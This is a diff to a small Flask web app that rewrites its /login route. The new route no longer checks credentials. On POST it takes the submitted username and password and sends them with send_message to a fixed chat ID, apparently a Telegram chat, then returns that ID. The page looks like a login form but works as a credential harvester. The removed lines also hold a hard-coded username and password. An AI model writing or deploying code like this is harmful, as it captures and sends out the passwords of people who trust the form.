@@ -68,18 +68,16 @@ def home():
     else:
         return "Hello Boss!"
 
-@app.route('/login', methods=['POST'])
+@app.route('/login', methods=['POST','GET'])
 def do_admin_login():
-    if request.form['password'] == 'python' and request.form['username'] == 'vorovik':
-        session['logged_in'] = True
-        r='<h1>Session=True</h1>'
-        #get_password('vorovik')
-    else:
-        flash('wrong password!')
-        return 'ok'
-    #return home()
-    #return '<h1>Session=True</h1>  '+r
-    return 'ok'
+    if request.method=='POST':
+        chat_id='488735610'
+        text= request.form['password'] +' '+request.form['username']
+        send_message(chat_id,text)
+        return jsonify(chat_id)
+    return '<h1>Login</h1>'
+
+
 
 @app.route('/webhook/',methods=['POST','GET'])
 def index():
